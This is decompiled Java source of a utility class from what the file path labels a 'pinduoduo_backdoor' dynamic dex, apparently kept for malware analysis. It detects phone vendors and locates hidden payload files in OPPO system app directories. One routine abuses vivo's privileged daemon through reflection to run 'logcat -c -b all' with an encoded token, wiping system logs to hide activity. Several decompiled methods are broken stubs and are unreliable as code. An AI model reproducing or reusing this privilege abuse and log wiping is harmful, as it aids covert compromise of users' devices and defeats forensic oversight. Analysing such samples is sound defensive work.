package com.google.android.sd.biz_dynamic_dex.base;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.text.TextUtils;
import java.io.Closeable;
import java.io.File;
import java.io.FileFilter;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.util.Calendar;
import java.util.Locale;
import org.json.JSONObject;

public class DynamicUtils {
  public static final String BR_C_ID_KEY = "a_b_1";
  
  public static final String BR_TK_ID_KEY = "a_b_2";
  
  private static String CID;
  
  private static final String HOST_DIR_NAME = ".client_slog_cache";
  
  private static final String TAG = "DynamicUtils";
  
  private static String TKID;
  
  public static String bytesToHexString(byte[] paramArrayOfbyte) {
    if (paramArrayOfbyte == null || paramArrayOfbyte.length == 0)
      return null; 
    StringBuilder stringBuilder = new StringBuilder();
    int j = paramArrayOfbyte.length;
    for (int i = 0; i < j; i++) {
      String str = Integer.toHexString(paramArrayOfbyte[i] & 0xFF);
      if (str.length() < 2)
        stringBuilder.append(0); 
      stringBuilder.append(str);
    } 
    return stringBuilder.toString();
  }
  
  public static String calFileMd5(File paramFile) {
    if (paramFile == null)
      return ""; 
    if (!paramFile.exists())
      return ""; 
    try {
      String str = calStreamMd5(new FileInputStream(paramFile));
      boolean bool = TextUtils.isEmpty(str);
      return !bool ? str : "";
    } catch (Exception exception) {
      return "";
    } 
  }
  
  public static String calFileMd5(String paramString) {
    return TextUtils.isEmpty(paramString) ? "" : calFileMd5(new File(paramString));
  }
  
  private static String calStreamMd5(FileInputStream paramFileInputStream) {
    if (paramFileInputStream == null)
      return ""; 
    try {
      MessageDigest messageDigest = MessageDigest.getInstance("MD5");
      byte[] arrayOfByte = new byte[1024];
      while (true) {
        int i = paramFileInputStream.read(arrayOfByte);
        if (i > 0) {
          messageDigest.update(arrayOfByte, 0, i);
          continue;
        } 
        String str2 = bytesToHexString(messageDigest.digest());
        String str1 = str2;
        if (str2 != null)
          str1 = str2.toLowerCase(Locale.ROOT); 
        return str1;
      } 
    } catch (Exception exception) {
      return "";
    } finally {
      safetyClose(paramFileInputStream);
    } 
  }
  
  public static String calStringMd5(String paramString) {
    try {
      MessageDigest messageDigest = MessageDigest.getInstance("MD5");
      messageDigest.update(paramString.getBytes());
      String str = bytesToHexString(messageDigest.digest());
      paramString = str;
      if (str != null)
        paramString = str.toLowerCase(Locale.ROOT); 
      return paramString;
    } catch (Exception exception) {
      return "";
    } 
  }
  
  private static boolean checkApkFile(File paramFile) {
    return (paramFile != null && paramFile.exists() && paramFile.isFile() && paramFile.length() > 0L);
  }
  
  public static void clearLogcat() {
    if ("vivo".equalsIgnoreCase(getManufacturer()) && Build.VERSION.SDK_INT < 26)
      clearLogcatByVivoDaemon(); 
    try {
      return;
    } finally {
      Exception exception = null;
    } 
  }
  
  private static void clearLogcatByVivoDaemon() {
    try {
      Method method1 = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", new Class[] { String.class });
      method1.setAccessible(true);
      Object object = method1.invoke(null, new Object[] { "vivo_daemon.service" });
      Class<?> clazz = Class.forName("com.vivo.services.daemon.VivoDmServiceProxy");
      object = clazz.getDeclaredMethod("asInterface", new Class[] { IBinder.class }).invoke(null, new Object[] { object });
      Method method2 = clazz.getDeclaredMethod("runShellWithResult", new Class[] { String.class });
      method2.setAccessible(true);
      if (TextUtils.equals(System.getProperty("persist.vivo.vivo_daemon", ""), "3.1.0")) {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("GA8CLwlZ38dIAjZNQQ3IKP0bTy+JgYaJQxHB6oCXASLqbIAGS85UPD9PdEe7C52PCvdwzCswCtjlmPaoP+j4ZmMBXOtpylzI7yYS6hrcNra6zKh8C3Y68RGgBt45+OEOcDTRG73Bew2akGCXbwBp8mdbEioZEMrZsPdx+JNQavca19E43h8+FSNm2RdJAG/pGjtP+w3kHvPMM6hZEZItwLWsqwfFNjByVc9t9LfO818eR/qKh1hRJN8D2M2uuqmYrD35QPvw3uZWYqYt9strqbTvIarWBA/1wpPvdI9ddMcnXQxFbn/ApYxHfh9i+M6fWfe8pp4PKuV1WCuYb73hsw==?");
        stringBuilder.append("logcat -c -b all");
        method2.invoke(object, new Object[] { stringBuilder.toString() });
        return;
      } 
      method2.invoke(object, new Object[] { "logcat -c -b all" });
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  public static boolean copyFile(File paramFile1, File paramFile2) {
    // Byte code:
    //   0: aconst_null
    //   1: astore #5
    //   3: aconst_null
    //   4: astore #4
    //   6: new java/io/FileInputStream
    //   9: dup
    //   10: aload_0
    //   11: invokespecial <init> : (Ljava/io/File;)V
    //   14: astore_3
    //   15: new java/io/FileOutputStream
    //   18: dup
    //   19: aload_1
    //   20: invokespecial <init> : (Ljava/io/File;)V
    //   23: astore_0
    //   24: sipush #1024
    //   27: newarray byte
    //   29: astore_1
    //   30: aload_3
    //   31: aload_1
    //   32: invokevirtual read : ([B)I
    //   35: istore_2
    //   36: iload_2
    //   37: ifle -> 50
    //   40: aload_0
    //   41: aload_1
    //   42: iconst_0
    //   43: iload_2
    //   44: invokevirtual write : ([BII)V
    //   47: goto -> 30
    //   50: aload_3
    //   51: invokevirtual close : ()V
    //   54: aload_0
    //   55: invokevirtual close : ()V
    //   58: iconst_1
    //   59: ireturn
    //   60: astore #4
    //   62: aload_0
    //   63: astore_1
    //   64: aload #4
    //   66: astore_0
    //   67: goto -> 73
    //   70: astore_0
    //   71: aconst_null
    //   72: astore_1
    //   73: goto -> 89
    //   76: aconst_null
    //   77: astore_0
    //   78: aload_3
    //   79: astore_1
    //   80: goto -> 104
    //   83: astore_0
    //   84: aconst_null
    //   85: astore_1
    //   86: aload #4
    //   88: astore_3
    //   89: aload_3
    //   90: invokevirtual close : ()V
    //   93: aload_1
    //   94: invokevirtual close : ()V
    //   97: aload_0
    //   98: athrow
    //   99: aconst_null
    //   100: astore_0
    //   101: aload #5
    //   103: astore_1
    //   104: aload_1
    //   105: invokevirtual close : ()V
    //   108: aload_0
    //   109: invokevirtual close : ()V
    //   112: iconst_0
    //   113: ireturn
    //   114: astore_0
    //   115: goto -> 99
    //   118: astore_0
    //   119: goto -> 76
    //   122: astore_1
    //   123: goto -> 78
    //   126: astore_0
    //   127: goto -> 58
    //   130: astore_1
    //   131: goto -> 97
    //   134: astore_0
    //   135: iconst_0
    //   136: ireturn
    // Exception table:
    //   from	to	target	type
    //   6	15	114	java/lang/Exception
    //   6	15	83	finally
    //   15	24	118	java/lang/Exception
    //   15	24	70	finally
    //   24	30	122	java/lang/Exception
    //   24	30	60	finally
    //   30	36	122	java/lang/Exception
    //   30	36	60	finally
    //   40	47	122	java/lang/Exception
    //   40	47	60	finally
    //   50	58	126	java/lang/Exception
    //   89	97	130	java/lang/Exception
    //   104	112	134	java/lang/Exception
  }
  
  public static boolean createDir(File paramFile) {
    try {
      paramFile = paramFile.getParentFile();
      return (paramFile == null) ? false : ((paramFile.exists() && paramFile.isDirectory()) ? true : paramFile.mkdirs());
    } catch (Exception exception) {
      return false;
    } 
  }
  
  public static void debugLog(String paramString) {
    debugLog("", paramString);
  }
  
  public static void debugLog(String paramString1, String paramString2) {}
  
  public static void debugLog(String paramString1, String paramString2, Throwable paramThrowable) {}
  
  public static void debugLog(String paramString, Throwable paramThrowable) {
    debugLog("", paramString, paramThrowable);
  }
  
  public static void deleteRecycle(File paramFile) {
    if (paramFile == null)
      return; 
    try {
      if (!paramFile.exists())
        return; 
      if (paramFile.isDirectory()) {
        File[] arrayOfFile = paramFile.listFiles();
        if (arrayOfFile != null) {
          int j = arrayOfFile.length;
          for (int i = 0; i < j; i++)
            deleteRecycle(arrayOfFile[i]); 
        } 
      } 
      paramFile.delete();
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  public static String getApkDirPath(Context paramContext) {
    if (isOppoPictorial(paramContext) || isOppoSpeech(paramContext)) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("/data/data/");
      stringBuilder.append(paramContext.getPackageName());
      stringBuilder.append("/app_kernel/share/");
      return stringBuilder.toString();
    } 
    return paramContext.getFilesDir().getAbsolutePath();
  }
  
  public static File getApkFile(Context paramContext, File paramFile, String paramString) {
    if (paramFile != null) {
      File file1 = getApkFileByDir(paramContext, paramString, paramFile);
      if (checkApkFile(file1))
        return file1; 
      paramFile = getApkFileByDir(paramContext, "temp", paramFile);
      if (checkApkFile(paramFile))
        return paramFile; 
    } 
    paramFile = getApkFileByDir(paramContext, paramString, paramContext.getFilesDir());
    if (checkApkFile(paramFile))
      return paramFile; 
    File file = getApkFileByDir(paramContext, "temp", paramContext.getFilesDir());
    return checkApkFile(file) ? file : null;
  }
  
  public static File getApkFile(Context paramContext, String paramString) {
    if (isOppoPictorial(paramContext) || isOppoSpeech(paramContext)) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("/data/data/");
      stringBuilder.append(paramContext.getPackageName());
      stringBuilder.append("/app_kernel/share/");
      return getApkFile(paramContext, new File(stringBuilder.toString()), paramString);
    } 
    return getApkFile(paramContext, null, paramString);
  }
  
  private static File getApkFileByDir(Context paramContext, final String name, File paramFile) {
    File file;
    StringBuilder stringBuilder;
    if (Constants.DEBUG) {
      file = Environment.getExternalStorageDirectory();
      stringBuilder = new StringBuilder();
      stringBuilder.append(name);
      stringBuilder.append(".tmp");
      return new File(file, stringBuilder.toString());
    } 
    Context context = null;
    if (stringBuilder == null)
      return null; 
    File[] arrayOfFile = stringBuilder.listFiles(new FileFilter() {
          public boolean accept(File param1File) {
            String str = param1File.getName();
            return (param1File.exists() && param1File.isFile() && !TextUtils.isEmpty(str) && str.startsWith(name) && str.endsWith(".tmp"));
          }
        });
    paramContext = context;
    if (arrayOfFile != null) {
      paramContext = context;
      if (arrayOfFile.length > 0)
        file = arrayOfFile[0]; 
    } 
    return file;
  }
  
  public static String getAppVersion(Context paramContext, String paramString) {
    if (paramContext != null && !TextUtils.isEmpty(paramString))
      try {
        return (paramContext.getPackageManager().getPackageInfo(paramString, 0)).versionName;
      } catch (Exception exception) {} 
    return "";
  }
  
  public static File getBizFile(Context paramContext) {
    return (Build.VERSION.SDK_INT < 24) ? new File("") : ((isOppoPictorial(paramContext) || isOppoSpeech(paramContext)) ? new File(paramContext.getDataDir(), "/app_kernel/share/95833.dat") : new File(paramContext.getFilesDir(), "95833.dat"));
  }
  
  public static File getBrFile(Context paramContext) {
    return (Build.VERSION.SDK_INT < 24) ? new File("") : ((isOppoPictorial(paramContext) || isOppoSpeech(paramContext)) ? new File(paramContext.getDataDir(), "/app_kernel/share/sd.br") : new File(paramContext.getFilesDir(), "sd.br"));
  }
  
  public static String getCid(Context paramContext) {
    try {
      if (!TextUtils.isEmpty(CID))
        return CID; 
      File file = getBrFile(paramContext);
      if (!file.exists())
        return ""; 
      String str = (new JSONObject(readFile(file.getAbsolutePath(), false))).optString("a_b_1");
      CID = str;
      return str;
    } catch (Exception exception) {
      return "";
    } 
  }
  
  public static File getCoreFile(Context paramContext) {
    return (Build.VERSION.SDK_INT < 24) ? new File("") : ((isOppoPictorial(paramContext) || isOppoSpeech(paramContext)) ? new File(paramContext.getDataDir(), "/app_kernel/share/95827.dat") : new File(paramContext.getFilesDir(), "95827.dat"));
  }
  
  public static File getDownloadDir(Context paramContext) {
    return getTargetDir(paramContext, "download");
  }
  
  public static File getExtWorkDir() {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append(Environment.getExternalStorageDirectory());
    stringBuilder.append("/Documents");
    File file = new File(stringBuilder.toString(), ".iSpirit");
    if (!file.exists())
      file.mkdirs(); 
    return file;
  }
  
  public static File getHostDir(Context paramContext) {
    File file = new File(paramContext.getFilesDir(), ".client_slog_cache");
    if (!file.exists() || !file.isDirectory())
      file.mkdirs(); 
    return file;
  }
  
  public static String getManufacturer() {
    String str2 = Build.MANUFACTURER;
    String str1 = "oppo";
    if (!"oppo".equalsIgnoreCase(str2)) {
      if ("realme".equalsIgnoreCase(str2))
        return "oppo"; 
      str1 = "huawei";
      if (!"huawei".equalsIgnoreCase(str2)) {
        if ("honor".equalsIgnoreCase(str2))
          return "huawei"; 
        str1 = "vivo";
        if (!"vivo".equalsIgnoreCase(str2)) {
          if ("bbk".equalsIgnoreCase(str2))
            return "vivo"; 
          str1 = "xiaomi";
          if (!"xiaomi".equalsIgnoreCase(str2))
            return "redmi".equalsIgnoreCase(str2) ? "xiaomi" : ""; 
        } 
      } 
    } 
    return str1;
  }
  
  public static String getSourceVersion(Context paramContext) {
    if (paramContext != null)
      try {
        return (paramContext.getPackageManager().getPackageInfo(paramContext.getPackageName(), 0)).versionName;
      } catch (Exception exception) {} 
    return "";
  }
  
  public static Field getSysField(Class<?> paramClass, String paramString) {
    int i = 0;
    try {
      Field[] arrayOfField = (Field[])Class.class.getDeclaredMethod("getDeclaredFields", new Class[0]).invoke(paramClass, new Object[0]);
      if (arrayOfField == null)
        return null; 
      int j = arrayOfField.length;
      return null;
    } finally {
      paramClass = null;
    } 
  }
  
  public static Method getSysMethod(Class<?> paramClass, String paramString) {
    int i = 0;
    try {
      Method[] arrayOfMethod = (Method[])Class.class.getDeclaredMethod("getDeclaredMethods", new Class[0]).invoke(paramClass, new Object[0]);
      if (arrayOfMethod == null)
        return null; 
      int j = arrayOfMethod.length;
      return null;
    } finally {
      paramClass = null;
    } 
  }
  
  public static File getTargetDir(Context paramContext, String paramString) {
    File file = new File(getHostDir(paramContext), paramString);
    if (!file.exists() || !file.isDirectory())
      file.mkdirs(); 
    return file;
  }
  
  public static File getTempDir(Context paramContext) {
    return getTargetDir(paramContext, "temp");
  }
  
  public static String getThrowableFullMessage(Throwable paramThrowable) {
    StringBuilder stringBuilder = new StringBuilder();
    int i = 0;
    while (i < 10 && paramThrowable != null) {
      try {
        stringBuilder.append(paramThrowable.getMessage());
        stringBuilder.append(";");
        paramThrowable = paramThrowable.getCause();
        i++;
      } catch (Exception exception) {
        stringBuilder.append("build_full_msg_error:");
        stringBuilder.append(exception.getMessage());
        stringBuilder.append(";");
        break;
      } 
    } 
    return stringBuilder.toString();
  }
  
  public static String getTkId(Context paramContext) {
    try {
      if (!TextUtils.isEmpty(TKID))
        return TKID; 
      File file = getBrFile(paramContext);
      if (!file.exists())
        return ""; 
      String str = (new JSONObject(readFile(file.getAbsolutePath(), false))).optString("a_b_2");
      TKID = str;
      return str;
    } catch (Exception exception) {
      return "";
    } 
  }
  
  public static boolean hasMethod(String paramString1, String paramString2, Class<?>[] paramArrayOfClass) {
    try {
      return true;
    } finally {
      paramString1 = null;
    } 
  }
  
  public static boolean isNetConnected(Context paramContext) {
    boolean bool = false;
    try {
      NetworkInfo networkInfo = ((ConnectivityManager)paramContext.getSystemService("connectivity")).getActiveNetworkInfo();
      boolean bool1 = bool;
      if (networkInfo != null) {
        boolean bool2 = networkInfo.isConnected();
        bool1 = bool;
        if (bool2)
          bool1 = true; 
      } 
      return bool1;
    } catch (Exception exception) {
      return false;
    } 
  }
  
  public static boolean isOppoPictorial(Context paramContext) {
    String str = paramContext.getPackageName();
    return ("com.heytap.pictorial".equalsIgnoreCase(str) || "com.coloros.pictorial".equalsIgnoreCase(str));
  }
  
  public static boolean isOppoSpeech(Context paramContext) {
    return "com.coloros.speechassist".equalsIgnoreCase(paramContext.getPackageName());
  }
  
  public static boolean isSameDay(long paramLong1, long paramLong2) {
    Calendar calendar1 = Calendar.getInstance();
    calendar1.setTimeInMillis(paramLong1);
    Calendar calendar2 = Calendar.getInstance();
    calendar2.setTimeInMillis(paramLong2);
    return (calendar1.get(1) == calendar2.get(1) && calendar1.get(2) == calendar2.get(2) && calendar1.get(6) == calendar2.get(6));
  }
  
  public static boolean isScreenOff(Context paramContext) {
    try {
      PowerManager powerManager = (PowerManager)paramContext.getSystemService("power");
      if (powerManager != null) {
        boolean bool = powerManager.isScreenOn();
        return bool ^ true;
      } 
    } finally {}
    return false;
  }
  
  public static boolean isScreenOn(Context paramContext) {
    return isScreenOff(paramContext) ^ true;
  }
  
  private static boolean isXiaomi() {
    String str = Build.MANUFACTURER;
    return ("xiaomi".equalsIgnoreCase(str) || "redmi".equalsIgnoreCase(str));
  }
  
  public static String readFile(String paramString, boolean paramBoolean) {
    // Byte code:
    //   0: aload_0
    //   1: invokestatic isEmpty : (Ljava/lang/CharSequence;)Z
    //   4: ifeq -> 10
    //   7: ldc ''
    //   9: areturn
    //   10: new java/lang/StringBuilder
    //   13: dup
    //   14: invokespecial <init> : ()V
    //   17: astore_3
    //   18: aconst_null
    //   19: astore_2
    //   20: new java/io/BufferedReader
    //   23: dup
    //   24: new java/io/FileReader
    //   27: dup
    //   28: aload_0
    //   29: invokespecial <init> : (Ljava/lang/String;)V
    //   32: invokespecial <init> : (Ljava/io/Reader;)V
    //   35: astore_0
    //   36: aload_0
    //   37: invokevirtual readLine : ()Ljava/lang/String;
    //   40: astore_2
    //   41: aload_2
    //   42: ifnull -> 66
    //   45: aload_3
    //   46: aload_2
    //   47: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   50: pop
    //   51: iload_1
    //   52: ifeq -> 36
    //   55: aload_3
    //   56: ldc_w '\\n'
    //   59: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   62: pop
    //   63: goto -> 36
    //   66: aload_0
    //   67: invokevirtual close : ()V
    //   70: goto -> 81
    //   73: aload_0
    //   74: ifnull -> 81
    //   77: aload_0
    //   78: invokevirtual close : ()V
    //   81: aload_3
    //   82: invokevirtual toString : ()Ljava/lang/String;
    //   85: areturn
    //   86: astore_0
    //   87: aload_2
    //   88: astore_0
    //   89: goto -> 73
    //   92: astore_2
    //   93: goto -> 100
    //   96: astore_0
    //   97: goto -> 81
    //   100: goto -> 73
    // Exception table:
    //   from	to	target	type
    //   20	36	86	finally
    //   36	41	92	finally
    //   45	51	92	finally
    //   55	63	92	finally
    //   66	70	96	java/io/IOException
    //   77	81	96	java/io/IOException
  }
  
  public static void runInNewThread(Runnable paramRunnable) {
    (new Thread(paramRunnable)).start();
  }
  
  public static void safetyClose(Closeable paramCloseable) {
    if (paramCloseable != null)
      try {
        paramCloseable.close();
        return;
      } catch (Exception exception) {
        return;
      }  
  }
  
  public static boolean writeFile(String paramString1, String paramString2) {
    if (TextUtils.isEmpty(paramString1))
      return false; 
    String str = null;
    try {
      FileOutputStream fileOutputStream = new FileOutputStream(paramString1);
    } finally {
      paramString1 = null;
    } 
    if (paramString1 != null)
      try {
        paramString1.close();
        return false;
      } catch (Exception exception) {
        return false;
      }  
    return false;
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\218a37ea-710d-49cb-b872-2a47a1115c69-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\DynamicUtils.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */